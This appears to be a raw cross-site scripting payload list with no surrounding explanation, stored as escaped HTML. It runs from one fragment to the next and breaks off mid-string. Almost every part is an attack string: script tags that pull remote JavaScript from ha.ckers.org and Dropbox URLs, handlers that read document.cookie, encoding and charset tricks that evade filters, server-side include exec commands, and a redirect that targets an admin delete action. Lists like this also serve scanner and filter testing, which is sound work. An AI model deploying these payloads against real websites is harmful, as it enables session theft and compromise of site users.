DATASRC=&quot;#xss&quot; DATAFLD=&quot;B&quot; DATAFORMATAS=&quot;HTML&quot;&gt;&lt;/SPAN&gt;&lt;HTML&gt;&lt;BODY&gt;&lt;?xml:namespace prefix=&quot;t&quot; ns=&quot;urn:schemas-microsoft-com:time&quot;&gt;&lt;?import namespace=&quot;t&quot; implementation=&quot;#default#time2&quot;&gt;&lt;t:set attributeName=&quot;innerHTML&quot; to=&quot;XSS&amp;lt;SCRIPT DEFER&amp;gt;javascript:alert(1)&amp;lt;/SCRIPT&amp;gt;&quot;&gt;&lt;/BODY&gt;&lt;/HTML&gt;&lt;SCRIPT SRC=&quot;%(jpg)s&quot;&gt;&lt;/SCRIPT&gt;&lt;HEAD&gt;&lt;META HTTP-EQUIV=&quot;CONTENT-TYPE&quot; CONTENT=&quot;text/html; charset=UTF-7&quot;&gt; &lt;/HEAD&gt;+ADw-SCRIPT+AD4-%(payload)s;+ADw-/SCRIPT+AD4-&lt;form id=&quot;test&quot; /&gt;&lt;button form=&quot;test&quot; formaction=&quot;javascript:javascript:alert(1)&quot;&gt;X&lt;body onscroll=javascript:alert(1)&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;input autofocus&gt;&lt;P STYLE=&quot;behavior:url(&apos;#default#time2&apos;)&quot; end=&quot;0&quot; onEnd=&quot;javascript:alert(1)&quot;&gt;&lt;STYLE&gt;@import&apos;%(css)s&apos;;&lt;/STYLE&gt;&lt;STYLE&gt;a{background:url(&apos;s1&apos; &apos;s2)}@import javascript:javascript:alert(1);&apos;);}&lt;/STYLE&gt;&lt;meta charset= &quot;x-imap4-modified-utf7&quot;&amp;&amp;&gt;&amp;&amp;&lt;script&amp;&amp;&gt;javascript:alert(1)&amp;&amp;;&amp;&amp;&lt;&amp;&amp;/script&amp;&amp;&gt;&lt;SCRIPT onreadystatechange=javascript:javascript:alert(1);&gt;&lt;/SCRIPT&gt;&lt;style onreadystatechange=javascript:javascript:alert(1);&gt;&lt;/style&gt;&lt;?xml version=&quot;1.0&quot;?&gt;&lt;html:html xmlns:html=&apos;http://www.w3.org/1999/xhtml&apos;&gt;&lt;html:script&gt;javascript:alert(1);&lt;/html:script&gt;&lt;/html:html&gt;&lt;embed code=%(scriptlet)s&gt;&lt;/embed&gt;&lt;embed code=javascript:javascript:alert(1);&gt;&lt;/embed&gt;&lt;embed src=%(jscript)s&gt;&lt;/embed&gt;&lt;frameset onload=javascript:javascript:alert(1)&gt;&lt;/frameset&gt;&lt;object onerror=javascript:javascript:alert(1)&gt;&lt;embed type=&quot;image&quot; src=%(scriptlet)s&gt;&lt;/embed&gt;&lt;XML ID=I&gt;&lt;X&gt;&lt;C&gt;&lt;![CDATA[&lt;IMG SRC=&quot;javas]]&lt;![CDATA[cript:javascript:alert(1);&quot;&gt;]]&lt;/C&gt;&lt;X&gt;&lt;/xml&gt;&lt;IMG SRC=&amp;{javascript:alert(1);};&gt;&lt;a href=&quot;jav&amp;#65ascript:javascript:alert(1)&quot;&gt;test1&lt;/a&gt;&lt;a href=&quot;jav&amp;#97ascript:javascript:alert(1)&quot;&gt;test1&lt;/a&gt;&lt;embed width=500 height=500 code=&quot;data:text/html,&lt;script&gt;%(payload)s&lt;/script&gt;&quot;&gt;&lt;/embed&gt;&lt;iframe srcdoc=&quot;&amp;LT;iframe&amp;sol;srcdoc=&amp;amp;lt;img&amp;sol;src=&amp;amp;apos;&amp;amp;apos;onerror=javascript:alert(1)&amp;amp;gt;&gt;&quot;&gt;&apos;;alert(String.fromCharCode(88,83,83))//&apos;;alert(String.fromCharCode(88,83,83))//&quot;;alert(String.fromCharCode(88,83,83))//&quot;;alert(String.fromCharCode(88,83,83))//--&gt;&lt;/SCRIPT&gt;&quot;&gt;&apos;&gt;&lt;SCRIPT&gt;alert(String.fromCharCode(88,83,83))&lt;/SCRIPT&gt;&apos;&apos;;!--&quot;&lt;XSS&gt;=&amp;{()}&lt;SCRIPT SRC=http://ha.ckers.org/xss.js&gt;&lt;/SCRIPT&gt;&lt;IMG SRC=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;&lt;IMG SRC=javascript:alert(&apos;XSS&apos;)&gt;&lt;IMG SRC=JaVaScRiPt:alert(&apos;XSS&apos;)&gt;&lt;IMG SRC=javascript:alert(&quot;XSS&quot;)&gt;&lt;IMG SRC=`javascript:alert(&quot;RSnake says, &apos;XSS&apos;&quot;)`&gt;&lt;a onmouseover=&quot;alert(document.cookie)&quot;&gt;xxs link&lt;/a&gt;&lt;a onmouseover=alert(document.cookie)&gt;xxs link&lt;/a&gt;&lt;IMG &quot;&quot;&quot;&gt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;&quot;&gt;&lt;IMG SRC=javascript:alert(String.fromCharCode(88,83,83))&gt;&lt;IMG SRC=# onmouseover=&quot;alert(&apos;xxs&apos;)&quot;&gt;&lt;IMG SRC= onmouseover=&quot;alert(&apos;xxs&apos;)&quot;&gt;&lt;IMG onmouseover=&quot;alert(&apos;xxs&apos;)&quot;&gt;&lt;IMG SRC=&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#39;&amp;#88;&amp;#83;&amp;#83;&amp;#39;&amp;#41;&gt;&lt;IMG SRC=&amp;#0000106&amp;#0000097&amp;#0000118&amp;#0000097&amp;#0000115&amp;#0000099&amp;#0000114&amp;#0000105&amp;#0000112&amp;#0000116&amp;#0000058&amp;#0000097&amp;#0000108&amp;#0000101&amp;#0000114&amp;#0000116&amp;#0000040&amp;#0000039&amp;#0000088&amp;#0000083&amp;#0000083&amp;#0000039&amp;#0000041&gt;&lt;IMG SRC=&amp;#x6A&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x70&amp;#x74&amp;#x3A&amp;#x61&amp;#x6C&amp;#x65&amp;#x72&amp;#x74&amp;#x28&amp;#x27&amp;#x58&amp;#x53&amp;#x53&amp;#x27&amp;#x29&gt;&lt;IMG SRC=&quot;jav ascript:alert(&apos;XSS&apos;);&quot;&gt;&lt;IMG SRC=&quot;jav&amp;#x09;ascript:alert(&apos;XSS&apos;);&quot;&gt;&lt;IMG SRC=&quot;jav&amp;#x0A;ascript:alert(&apos;XSS&apos;);&quot;&gt;&lt;IMG SRC=&quot;jav&amp;#x0D;ascript:alert(&apos;XSS&apos;);&quot;&gt;perl -e &apos;print &quot;&lt;IMG SRC=java\\0script:alert(\\&quot;XSS\\&quot;)&gt;&quot;;&apos; &gt; out&lt;IMG SRC=&quot; &amp;#14; javascript:alert(&apos;XSS&apos;);&quot;&gt;&lt;SCRIPT/XSS SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;&lt;BODY onload!#$%&amp;()*~+-_.,:;?@[/|\\]^`=alert(&quot;XSS&quot;)&gt;&lt;SCRIPT/SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;&lt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;);//&lt;&lt;/SCRIPT&gt;&lt;SCRIPT SRC=http://ha.ckers.org/xss.js?&lt; B &gt;&lt;SCRIPT SRC=//ha.ckers.org/.j&gt;&lt;IMG SRC=&quot;javascript:alert(&apos;XSS&apos;)&quot;&lt;iframe src=http://ha.ckers.org/scriptlet.html &lt;\\&quot;;alert(&apos;XSS&apos;);//&lt;/TITLE&gt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;);&lt;/SCRIPT&gt;&lt;INPUT TYPE=&quot;IMAGE&quot; SRC=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;&lt;BODY BACKGROUND=&quot;javascript:alert(&apos;XSS&apos;)&quot;&gt;&lt;IMG DYNSRC=&quot;javascript:alert(&apos;XSS&apos;)&quot;&gt;&lt;IMG LOWSRC=&quot;javascript:alert(&apos;XSS&apos;)&quot;&gt;&lt;STYLE&gt;li {list-style-image: url(&quot;javascript:alert(&apos;XSS&apos;)&quot;);}&lt;/STYLE&gt;&lt;UL&gt;&lt;LI&gt;XSS&lt;/br&gt;&lt;IMG SRC=&apos;vbscript:msgbox(&quot;XSS&quot;)&apos;&gt;&lt;IMG SRC=&quot;livescript:[code]&quot;&gt;&lt;BODY ONLOAD=alert(&apos;XSS&apos;)&gt;&lt;BGSOUND SRC=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;&lt;BR SIZE=&quot;&amp;{alert(&apos;XSS&apos;)}&quot;&gt;&lt;LINK REL=&quot;stylesheet&quot; HREF=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;&lt;LINK REL=&quot;stylesheet&quot; HREF=&quot;http://ha.ckers.org/xss.css&quot;&gt;&lt;STYLE&gt;@import&apos;http://ha.ckers.org/xss.css&apos;;&lt;/STYLE&gt;&lt;META HTTP-EQUIV=&quot;Link&quot; Content=&quot;&lt;http://ha.ckers.org/xss.css&gt;; REL=stylesheet&quot;&gt;&lt;STYLE&gt;BODY{-moz-binding:url(&quot;http://ha.ckers.org/xssmoz.xml#xss&quot;)}&lt;/STYLE&gt;&lt;STYLE&gt;@im\\port&apos;\\ja\\vasc\\ript:alert(&quot;XSS&quot;)&apos;;&lt;/STYLE&gt;&lt;IMG STYLE=&quot;xss:expr/*XSS*/ession(alert(&apos;XSS&apos;))&quot;&gt;exp/*&lt;A STYLE=&apos;no\\xss:noxss(&quot;*//*&quot;);xss:ex/*XSS*//*/*/pression(alert(&quot;XSS&quot;))&apos;&gt;&lt;STYLE TYPE=&quot;text/javascript&quot;&gt;alert(&apos;XSS&apos;);&lt;/STYLE&gt;&lt;STYLE&gt;.XSS{background-image:url(&quot;javascript:alert(&apos;XSS&apos;)&quot;);}&lt;/STYLE&gt;&lt;A CLASS=XSS&gt;&lt;/A&gt;&lt;STYLE type=&quot;text/css&quot;&gt;BODY{background:url(&quot;javascript:alert(&apos;XSS&apos;)&quot;)}&lt;/STYLE&gt;&lt;STYLE type=&quot;text/css&quot;&gt;BODY{background:url(&quot;javascript:alert(&apos;XSS&apos;)&quot;)}&lt;/STYLE&gt;&lt;XSS STYLE=&quot;xss:expression(alert(&apos;XSS&apos;))&quot;&gt;&lt;XSS STYLE=&quot;behavior: url(xss.htc);&quot;&gt;&#xBC;script&#xBE;alert(&#xA2;XSS&#xA2;)&#xBC;/script&#xBE;&lt;META HTTP-EQUIV=&quot;refresh&quot; CONTENT=&quot;0;url=javascript:alert(&apos;XSS&apos;);&quot;&gt;&lt;META HTTP-EQUIV=&quot;refresh&quot; CONTENT=&quot;0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K&quot;&gt;&lt;META HTTP-EQUIV=&quot;refresh&quot; CONTENT=&quot;0; URL=http://;URL=javascript:alert(&apos;XSS&apos;);&quot;&gt;&lt;IFRAME SRC=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;&lt;/IFRAME&gt;&lt;IFRAME SRC=# onmouseover=&quot;alert(document.cookie)&quot;&gt;&lt;/IFRAME&gt;&lt;FRAMESET&gt;&lt;FRAME SRC=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;&lt;/FRAMESET&gt;&lt;TABLE BACKGROUND=&quot;javascript:alert(&apos;XSS&apos;)&quot;&gt;&lt;TABLE&gt;&lt;TD BACKGROUND=&quot;javascript:alert(&apos;XSS&apos;)&quot;&gt;&lt;DIV STYLE=&quot;background-image: url(javascript:alert(&apos;XSS&apos;))&quot;&gt;&lt;DIV STYLE=&quot;background-image:\\0075\\0072\\006C\\0028&apos;\\006a\\0061\\0076\\0061\\0073\\0063\\0072\\0069\\0070\\0074\\003a\\0061\\006c\\0065\\0072\\0074\\0028.1027\\0058.1053\\0053\\0027\\0029&apos;\\0029&quot;&gt;&lt;DIV STYLE=&quot;background-image: url(&amp;#1;javascript:alert(&apos;XSS&apos;))&quot;&gt;&lt;DIV STYLE=&quot;width: expression(alert(&apos;XSS&apos;));&quot;&gt;&lt;BASE HREF=&quot;javascript:alert(&apos;XSS&apos;);//&quot;&gt; &lt;OBJECT TYPE=&quot;text/x-scriptlet&quot; DATA=&quot;http://ha.ckers.org/scriptlet.html&quot;&gt;&lt;/OBJECT&gt;&lt;EMBED SRC=&quot;data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==&quot; type=&quot;image/svg+xml&quot; AllowScriptAccess=&quot;always&quot;&gt;&lt;/EMBED&gt;&lt;SCRIPT SRC=&quot;http://ha.ckers.org/xss.jpg&quot;&gt;&lt;/SCRIPT&gt;&lt;!--#exec cmd=&quot;/bin/echo &apos;&lt;SCR&apos;&quot;--&gt;&lt;!--#exec cmd=&quot;/bin/echo &apos;IPT SRC=http://ha.ckers.org/xss.js&gt;&lt;/SCRIPT&gt;&apos;&quot;--&gt;&lt;? echo(&apos;&lt;SCR)&apos;;echo(&apos;IPT&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;&apos;); ?&gt;&lt;IMG SRC=&quot;http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode&quot;&gt;Redirect 302 /a.jpg http://victimsite.com/admin.asp&amp;deleteuser&lt;META HTTP-EQUIV=&quot;Set-Cookie&quot; Content=&quot;USERID=&lt;SCRIPT&gt;alert(&apos;XSS&apos;)&lt;/SCRIPT&gt;&quot;&gt; &lt;HEAD&gt;&lt;META HTTP-EQUIV=&quot;CONTENT-TYPE&quot; CONTENT=&quot;text/html; charset=UTF-7&quot;&gt; &lt;/HEAD&gt;+ADw-SCRIPT+AD4-alert(&apos;XSS&apos;);+ADw-/SCRIPT+AD4-&lt;SCRIPT a=&quot;&gt;&quot; SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;&lt;SCRIPT =&quot;&gt;&quot; SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;&lt;SCRIPT a=&quot;&gt;&quot; &apos;&apos; SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;&lt;SCRIPT &quot;a=&apos;&gt;&apos;&quot; SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;&lt;SCRIPT a=`&gt;` SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;&lt;SCRIPT a=&quot;&gt;&apos;&gt;&quot; SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;&lt;SCRIPT&gt;document.write(&quot;&lt;SCRI&quot;);&lt;/SCRIPT&gt;PT SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;&lt;A HREF=&quot;http://66.102.7.147/&quot;&gt;XSS&lt;/A&gt;&lt;A HREF=&quot;http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D&quot;&gt;XSS&lt;/A&gt;&lt;A HREF=&quot;http://1113982867/&quot;&gt;XSS&lt;/A&gt;&lt;A HREF=&quot;http://0x42.0x0000066.0x7.0x93/&quot;&gt;XSS&lt;/A&gt;&lt;A HREF=&quot;http://0102.0146.0007.00000223/&quot;&gt;XSS&lt;/A&gt;&lt;A HREF=&quot;htt p://6 6.000146.0x7.147/&quot;&gt;XSS&lt;/A&gt;&lt;iframe src=&quot;&amp;Tab;javascript:prompt(1)&amp;Tab;&quot;&gt;&lt;svg&gt;&lt;style&gt;{font-family&amp;colon;&apos;&lt;iframe/onload=confirm(1)&gt;&apos;&lt;input/onmouseover=&quot;javaSCRIPT&amp;colon;confirm&amp;lpar;1&amp;rpar;&quot;&lt;sVg&gt;&lt;scRipt &gt;alert&amp;lpar;1&amp;rpar; {Opera}&lt;img/src=`` onerror=this.onerror=confirm(1)&lt;form&gt;&lt;isindex formaction=&quot;javascript&amp;colon;confirm(1)&quot;&lt;img src=``&amp;NewLine; onerror=alert(1)&amp;NewLine;&lt;script/&amp;Tab; src=&apos;https://dl.dropbox.com/u/13018058/js.js&apos; /&amp;Tab;&gt;&lt;/script&gt;&lt;ScRipT 5-0*3+9/3=&gt;prompt(1)&lt;/ScRipT giveanswerhere=?&lt;iframe/src=&quot;data:text/html;&amp;Tab;base64&amp;Tab;,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg==&quot;&gt;&lt;script /**/&gt;/**/alert(1)/**/&lt;/script /**/&amp;#34;&amp;#62;&lt;h1/onmouseover=&apos;\\u0061lert(1)&apos;&gt;&lt;iframe/src=&quot;data:text/html,&lt;svg &amp;#111;&amp;#110;load=alert(1)&gt;&quot;&gt;&lt;meta content=&quot;&amp;NewLine; 1 &amp;NewLine;; JAVASCRIPT&amp;colon; alert(1)&quot; http-equiv=&quot;refresh&quot;/&gt;&lt;svg&gt;&lt;script xlink:href=data&amp;colon;,window.open(&apos;https://www.google.com/&apos;)&gt;&lt;/script&lt;svg&gt;&lt;script x:href=&apos;https://dl.dropbox.com/u/13018058/js.js&apos; {Opera}&lt;meta http-equiv=&quot;refresh&quot; content=&quot;0;url=javascript:confirm(1)&quot;&gt;&lt;iframe src=javascript&amp;colon;alert&amp;lpar;document&amp;period;location&amp;rpar;&gt;&lt;form&gt;&lt;a href=&quot;javascript:\\u0061lert&amp;#x28;1&amp;#x29;&quot;&gt;X&lt;/script&gt;&lt;img/*/src=&quot;worksinchrome&amp;colon;prompt&amp;#x28;1&amp;#x29;&quot;/*/onerror=&apos;eval(src)&apos;&gt;&lt;img/&amp;#09;&amp;#10;&amp;#11; src=`~` onerror=prompt(1)&gt;&lt;form&gt;&lt;iframe &amp;#09;&amp;#10;&amp;#11; src=&quot;javascript&amp;#58;alert(1)&quot;&amp;#11;&amp;#10;&amp;#09;;&gt;&lt;a href=&quot;data:application/x-x509-user-cert;&amp;NewLine;base64&amp;NewLine;,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&quot;&amp;#09;&amp;#10;&amp;#11;&gt;X&lt;/ahttp://www.google&lt;script .com&gt;alert(document.location)&lt;/script&lt;a&amp;#32;href&amp;#61;&amp;#91;&amp;#00;&amp;#93;&quot;&amp;#00; onmouseover=prompt&amp;#40;1&amp;#41;&amp;#47;&amp;#47;&quot;&gt;XYZ&lt;/a&lt;img/src=@&amp;#32;&amp;#13; onerror = prompt(&apos;&amp;#49;&apos;)&lt;style/onload=prompt&amp;#40;&apos;&amp;#88;&amp;#83;&amp;#83;&apos;&amp;#41;&lt;script ^__^&gt;alert(String.fromCharCode(49))&lt;/script ^__^&lt;/style &amp;#32;&gt;&lt;script &amp;#32; :-(&gt;/**/alert(document.location)/**/&lt;/script &amp;#32; :-(&amp;#00;&lt;/form&gt;&lt;input type&amp;#61;&quot;date&quot; onfocus=&quot;alert(1)&quot;&gt;&lt;form&gt;&lt;textarea &amp;#13; onkeyup=&apos;\\u0061\\u006C\\u0065\\u0072\\u0074&amp;#x28;1&amp;#x29;&apos;&gt;&lt;script /***/&gt;/***/confirm(&apos;\\uFF41\\uFF4C\\uFF45\\uFF52\\uFF54\\u1455\\uFF11\\u1450&apos;)/***/&lt;/script /***/&lt;iframe srcdoc=&apos;&amp;lt;body onload=prompt&amp;lpar;1&amp;rpar;&amp;gt;&apos;&gt;&lt;a href=&quot;javascript:void(0)&quot; onmouseover=&amp;NewLine;javascript:alert(1)&amp;NewLine;&gt;X&lt;/a&gt;&lt;script ~~~&gt;alert(0%0)&lt;/script ~~~&gt;&lt;style/onload=&amp;lt;!--&amp;#09;&amp;gt;&amp;#10;alert&amp;#10;&amp;lpar;1&amp;rpar;&gt;&lt;///style///&gt;&lt;span %2F onmousemove=&apos;alert&amp;lpar;1&amp;rpar;&apos;&gt;SPAN&lt;img/src=&apos;http://i.imgur.com/P8mL8.jpg&apos; onmouseover=&amp;Tab;prompt(1)&amp;#34;&amp;#62;&lt;svg&gt;&lt;style&gt;{-o-link-source&amp;colon;&apos;&lt;body/onload=confirm(1)&gt;&apos;&amp;#13;&lt;blink/&amp;#13; onmouseover=pr&amp;#x6F;mp&amp;#116;(1)&gt;OnMouseOver {Firefox &amp; Opera}&lt;marquee onstart=&apos;javascript:alert&amp;#x28;1&amp;#x29;&apos;&gt;^__^&lt;div/style=&quot;width:expression(confirm(1))&quot;&gt;X&lt;/div&gt; {IE7}&lt;iframe// src=javaSCRIPT&amp;colon;alert(1)//&lt;form/action=javascript&amp;#x3A;alert&amp;lpar;document&amp;period;cookie&amp;rpar;&gt;&lt;input/type=&apos;submit&apos;&gt;///*iframe/src*/&lt;iframe/src=&quot;&lt;iframe/src=@&quot;/onload=prompt(1) /*iframe/src*/&gt;//|\\\\ &lt;script //|\\\\ src=&apos;https://dl.dropbox.com/u/13018058/js.js&apos;&gt; //|\\\\ &lt;/script //|\\\\&lt;/font&gt;/&lt;svg&gt;&lt;style&gt;{src&amp;#x3A;&apos;&lt;style/onload=this.onload=confirm(1)&gt;&apos;&lt;/font&gt;/&lt;/style&gt;&lt;a/href=&quot;javascript:&amp;#13; javascript:prompt(1)&quot;&gt;&lt;input type=&quot;X&quot;&gt;&lt;/plaintext\\&gt;&lt;/|\\&gt;&lt;plaintext/onmouseover=prompt(1)&lt;/svg&gt;&apos;&apos;&lt;svg&gt;&lt;script &apos;AQuickBrownFoxJumpsOverTheLazyDog&apos;&gt;alert&amp;#x28;1&amp;#x29; {Opera}&lt;a href=&quot;javascript&amp;colon;\\u0061&amp;#x6C;&amp;#101%72t&amp;lpar;1&amp;rpar;&quot;&gt;&lt;button&gt;&lt;div onmouseover=&apos;alert&amp;lpar;1&amp;rpar;&apos;&gt;DIV&lt;/div&gt;&lt;iframe style=&quot;position:absolute;top:0;left:0;width:100%;height:100%&quot; onmouseover=&quot;prompt(1)&quot;&gt;&lt;a href=&quot;jAvAsCrIpT&amp;colon;alert&amp;lpar;1&amp;rpar;&quot;&gt;X&lt;/a&gt;&lt;embed src=&quot;http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf&quot;&gt;&lt;object data=&quot;http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf&quot;&gt;&lt;var onmouseover=&quot;prompt(1)&quot;&gt;On Mouse Over&lt;/var&gt;&lt;a href=javascript&amp;colon;alert&amp;lpar;document&amp;period;cookie&amp;rpar;&gt;Click Here&lt;/a&gt;&lt;img src=&quot;/&quot; =_=&quot; title=&quot;onerror=&apos;prompt(1)&apos;&quot;&gt;&lt;%&lt;!--&apos;%&gt;&lt;script&gt;alert(1);&lt;/script --&gt;&lt;script src=&quot;data:text/javascript,alert(1)&quot;&gt;&lt;/script&gt;&lt;iframe/src \\/\\/onload = prompt(1)&lt;iframe/onreadystatechange=alert(1)&lt;svg/onload=alert(1)&lt;input value=&lt;&gt;&lt;iframe/src=javascript:confirm(1)&lt;input type=&quot;text&quot; value=`` &lt;div/onmouseover=&apos;alert(1)&apos;&gt;X&lt;/div&gt;http://www.&lt;script&gt;alert(1)&lt;/script .com&lt;iframe src=j&amp;NewLine;&amp;Tab;a&amp;NewLine;&amp;Tab;&amp;Tab;v&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;a&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;s&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;c&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;r&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;i&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;p&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;t&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;colon;a&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;l&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;e&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;r&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;t&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;28&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;1&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;%29&gt;&lt;/iframe&gt;&lt;svg&gt;&lt;script ?&gt;alert(1)&lt;iframe src=j&amp;Tab;a&amp;Tab;v&amp;Tab;a&amp;Tab;s&amp;Tab;c&amp;Tab;r&amp;Tab;i&amp;Tab;p&amp;Tab;t&amp;Tab;:a&amp;Tab;l&amp;Tab;e&amp;Tab;r&amp;Tab;t&amp;Tab;%28&amp;Tab;1&amp;Tab;%29&gt;&lt;/iframe&gt;&lt;img src=`xx:xx`onerror=alert(1)&gt;&lt;object type=&quot;text/x-scriptlet&quot; data=&quot;http://jsfiddle.net/XLE63/ &quot;&gt;&lt;/object&gt;&lt;meta http-equiv=&quot;refresh&quot; content=&quot;0;javascript&amp;colon;alert(1)&quot;/&gt;&lt;math&gt;&lt;a xlink:href=&quot;//jsfiddle.net/t846h/&quot;&gt;click&lt;embed code=&quot;http://businessinfo.co.uk/labs/xss/xss.swf&quot; allowscriptaccess=always&gt;&lt;svg contentScriptType=text/vbs&gt;&lt;script&gt;MsgBox+1&lt;a href=&quot;data:text/html;base64_,&lt;svg/onload=\\u0061&amp;#x6C;&amp;#101%72t(1)&gt;&quot;&gt;X&lt;/a&lt;iframe/onreadystatechange=\\u0061\\u006C\\u0065\\u0072\\u0074(&apos;\\u0061&apos;) worksinIE&gt;&lt;script&gt;~&apos;\\u0061&apos; ; \\u0074\\u0068\\u0072\\u006F\\u0077 ~ \\u0074\\u0068\\u0069\\u0073. \\u0061\\u006C\\u0065\\u0072\\u0074(~&apos;\\u0061&apos;)&lt;/script U+&lt;script/src=&quot;data&amp;colon;text%2Fj\\u0061v\\u0061script,\\u0061lert(&apos;\\u0061&apos;)&quot;&gt;&lt;/script a=\\u0061 &amp; /=%2F&lt;script/src=data&amp;colon;text/j\\u0061v\\u0061&amp;#115&amp;#99&amp;#114&amp;#105&amp;#112&amp;#116,\\u0061%6C%65%72%74(/XSS/)&gt;&lt;/script&lt;object data=javascript&amp;colon;\\u0061&amp;#x6C;&amp;#101%72t(1)&gt;&lt;script&gt;+-+-1-+-+alert(1)&lt;/script&gt;&lt;body/onload=&amp;lt;!--&amp;gt;&amp;#10alert(1)&gt;&lt;script itworksinallbrowsers&gt;/*&lt;script* */alert(1)&lt;/script&lt;img src ?itworksonchrome?\\/onerror = alert(1)&lt;svg&gt;&lt;script&gt;//&amp;NewLine;confirm(1);&lt;/script &lt;/svg&gt;&lt;svg&gt;&lt;script onlypossibleinopera:-)&gt; alert(1)&lt;a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa 